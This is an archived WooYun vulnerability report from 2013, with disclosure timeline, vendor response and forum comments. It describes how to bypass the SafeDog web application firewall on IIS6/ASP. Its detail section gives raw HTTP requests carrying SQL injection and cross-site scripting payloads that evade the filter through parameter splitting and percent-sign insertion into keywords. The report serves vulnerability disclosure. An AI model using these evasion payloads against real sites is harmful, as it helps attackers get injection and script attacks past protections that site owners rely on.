{"id": 5684, "wybug_id": "wooyun-2013-044924", "wybug_title": "安全狗绕过之注射和跨站", "wybug_corp": "安全狗", "wybug_author": "路人甲", "wybug_date": "2013-12-04 18:24", "wybug_open_date": "2014-03-01 18:24", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误", "客户端程序设计错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-09：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-02-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-01：\t细节向公众公开  简要描述： 嗯 环境是iis6+asp 详细说明：  只要清楚安全狗的数据流是\nnetwork->iis->safedog->asp.dll\n就知道可能绕过的方式了\nGET /1.asp?a=1<img%20src='#'%20onerror=alert() HTTP/1.1Host: 192.168.199.134Connection: keep-aliveContent-Length: 7\n绕过了吧，呵呵\nGET /1.asp?a=1%20and/*&a=*/1=1 HTTP/1.1Host: 192.168.199.134Connection: keep-aliveContent-Length: 7\n绕过了吧 呵呵再来POST基本没什么悬念\nPOST /1.asp HTTP/1.1Host: 192.168.199.134Content-Type: application/x-www-form-urlencodedConnection: keep-aliveContent-Length: 20a=123%20a%nd%201=1\n同理跨站\nPOST /1.asp HTTP/1.1Host: 192.168.199.134Content-Type: application/x-www-form-urlencodedConnection: keep-aliveContent-Length: 20a=<scri%pt>alert()</scri%pt>\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-03-01 18:24 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-04 18:25 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  路人甲都是很给力的    \n     2013-12-04 18:46 |    \t\tYY-2012 \t\t\t( 普通白帽子  |\t\t\t        Rank:2763 漏洞数:641        | 意淫，是《红楼梦》原创的词汇，但后来演变...)\t\t \n  xsser    \n     2013-12-04 18:57 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @YY-2012 ?    \n     2013-12-04 19:03 |    \t\tYY-2012 \t\t\t( 普通白帽子  |\t\t\t        Rank:2763 漏洞数:641        | 意淫，是《红楼梦》原创的词汇，但后来演变...)\t\t \n  @xsser 是不是你发的    \n     2013-12-05 08:47 |    \t\tLeon \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:6        | 永无宁日啊)\t\t \n  我只关注php是不是也会？    \n     2013-12-05 10:05 |    \t\tnick被注册 \t\t\t( 普通白帽子  |\t\t\t        Rank:125 漏洞数:20        | 天一)\t\t \n  这条狗越来越难控制了    \n     2013-12-27 09:09 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  @wefgod @xsser没太看懂，知道在传输过程中的编码绕过，但是不知道具体数据流向的过程中绕过的形式。例如到network-iis是什么样子，到狗是什么样子。。。  求详细，或者参考资料、关键字，都可以    \n     2013-12-27 10:58 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @luwikes 其实我也不太明白他想表达什么，很含糊    \n     2014-03-06 21:55 |    \t\thack2012 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:3        | 关注信息安全 http://www.waitalone.cn/)\t\t \n  使用/*&id=*/这个确实可以绕过部分，但是有select的时候就不太给力了。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}